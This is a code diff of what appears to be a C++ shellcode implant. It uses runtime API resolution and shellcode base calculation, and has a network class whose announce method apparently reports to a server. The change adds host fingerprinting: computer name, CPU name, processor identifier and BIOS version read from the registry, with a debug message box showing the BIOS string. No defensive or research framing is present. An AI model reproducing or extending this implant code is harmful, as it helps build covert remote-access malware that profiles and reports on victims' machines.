@@ -16,18 +16,80 @@ extern "C" auto declfn entry(_In_ void *args) -> void {
 class Machine {
 public:
     char name[16];
-
-    Machine(uintptr_t kernel32_handle);
+    char cpu_name[256];
+    char identifier[256];
+    char bios[256];
+    Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle);
 
 private:
-    uintptr_t kernel32_handle;
+    uintptr_t ntdll_handle, kernel32_handle;
     void resolve_name(void);
+    void resolve_cpu_name(void);
+    void resolve_identifier(void);
+    void resolve_bios(void);
 };
 
-Machine::Machine(uintptr_t kernel32_handle) {
+Machine::Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle) {
     this->kernel32_handle = kernel32_handle;
-
+    this->ntdll_handle = ntdll_handle;
     this->resolve_name();
+    this->resolve_cpu_name();
+    this->resolve_identifier();
+    this->resolve_bios();
+}
+
+void Machine::resolve_bios(void) {
+    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
+	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
+    DWORD type = 0;
+    DWORD pcb_data = sizeof(this->cpu_name);
+    LSTATUS result = reg_get_value(
+        HKEY_LOCAL_MACHINE,
+        "HARDWARE\\DESCRIPTION\\System",
+        "SystemBiosVersion",
+        RRF_RT_REG_SZ,
+        &type,
+        this->bios,
+        &pcb_data
+    );
+}
+
+void Machine::resolve_identifier(void) {
+    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
+	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
+    DWORD type = 0;
+    DWORD pcb_data = sizeof(this->cpu_name);
+    LSTATUS result = reg_get_value(
+        HKEY_LOCAL_MACHINE,
+        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
+        "Identifier",
+        RRF_RT_REG_SZ,
+        &type,
+        this->identifier,
+        &pcb_data
+    );
+}
+
+void Machine::resolve_cpu_name(void) {
+    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
+	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
+    DWORD type = 0;
+    DWORD pcb_data = sizeof(this->cpu_name);
+    LSTATUS result = reg_get_value(
+        HKEY_LOCAL_MACHINE,
+        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
+        "ProcessorNameString",
+        RRF_RT_REG_SZ,
+        &type,
+        this->cpu_name,
+        &pcb_data
+    );
+}
+
+void Machine::resolve_name(void) {
+    decltype(GetComputerNameA) *get_computer_name = RESOLVE_API(this->kernel32_handle, GetComputerNameA);
+    unsigned long pc_name_size = sizeof(this->name) / sizeof(this->name[0]);
+    get_computer_name(this->name, &pc_name_size);
 }
 
 class Net {
@@ -147,12 +209,6 @@ char* Net::announce(char name[16]) {
     return resp_data;
 }
 
-void Machine::resolve_name(void) {
-    decltype(GetComputerNameA) *get_computer_name = RESOLVE_API(this->kernel32_handle, GetComputerNameA);
-    unsigned long pc_name_size = sizeof(this->name) / sizeof(this->name[0]);
-    get_computer_name(this->name, &pc_name_size);
-}
-
 declfn instance::instance(void) {
 	// Calculate the shellcode base address + size.
 	base.address = RipStart();
@@ -206,8 +262,11 @@ auto declfn instance::start(_In_ void *arg) -> void {
 
 	decltype(Sleep) *sleep = RESOLVE_API(reinterpret_cast<uintptr_t>(kernel32.handle), Sleep);
 
-	Machine machine(reinterpret_cast<uintptr_t>(kernel32.handle));
-	msgbox(nullptr, machine.name, symbol<const char *>("caption"), MB_OK);
+	Machine machine(
+        reinterpret_cast<uintptr_t>(ntdll.handle),
+        reinterpret_cast<uintptr_t>(kernel32.handle)
+    );
+	msgbox(nullptr, machine.bios, symbol<const char *>("caption"), MB_OK);
 
     Net net(
         reinterpret_cast<uintptr_t>(ntdll.handle),
